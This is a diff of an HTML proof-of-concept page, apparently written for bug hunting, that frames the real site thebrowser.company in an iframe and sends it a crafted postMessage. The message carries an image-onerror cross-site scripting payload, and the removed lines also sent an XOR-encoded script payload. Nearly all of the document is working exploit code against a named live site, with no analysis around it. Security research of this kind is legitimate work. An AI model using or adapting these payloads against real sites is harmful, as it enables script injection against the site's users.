@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>✅ DOM XSS PoC – thebrowser.company</title>
+  <meta charset="UTF-8">
+  <title>XSS PoC - thebrowser.company</title>
 </head>
 <body>
-  <h2>✅ PoC: DOM XSS via postMessage (final test)</h2>
-  <iframe id="target" src="https://thebrowser.company/" width="100%" height="600" style="border:2px solid #0f0;"></iframe>
+  <h1>✅ DOM XSS via postMessage</h1>
+  <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border:1px solid #000;"></iframe>
 
   <script>
     const iframe = document.getElementById("target");
@@ -14,30 +14,18 @@
     iframe.onload = () => {
       console.log("✅ iframe loaded");
 
-      // 1. Structured payload (used in internal messaging)
-      const structuredPayload = {
+      // البايلود الآمن الذي لا يسبب syntax error
+      const payload = {
         message: "OB_SHOULD_SHOW_PICKER",
         content: {
           marketerId: [
-            `<img src=x onerror=alert('XSS')>`
+            "<img src='x' onerror='alert(document.domain)'>"
           ]
         }
       };
 
-      // 2. XOR payload (if decoder is active)
-      function xorEncode(str, key = 0x66) {
-        const keyHex = key.toString(16).padStart(2, '0');
-        return keyHex + Array.from(str).map(c =>
-          (c.charCodeAt(0) ^ key).toString(16).padStart(2, '0')
-        ).join('');
-      }
-
-      const xorPayload = xorEncode("<script>alert('XSS from XOR')</script>");
-
-      // ✅ Send both payloads
-      iframe.contentWindow.postMessage(structuredPayload, "*");
-      iframe.contentWindow.postMessage(xorPayload, "*");
-      console.log("🚀 Payloads sent via postMessage");
+      console.log("🚀 Sending XSS payload via postMessage...");
+      iframe.contentWindow.postMessage(payload, "*");
     };
   </script>
 </body>
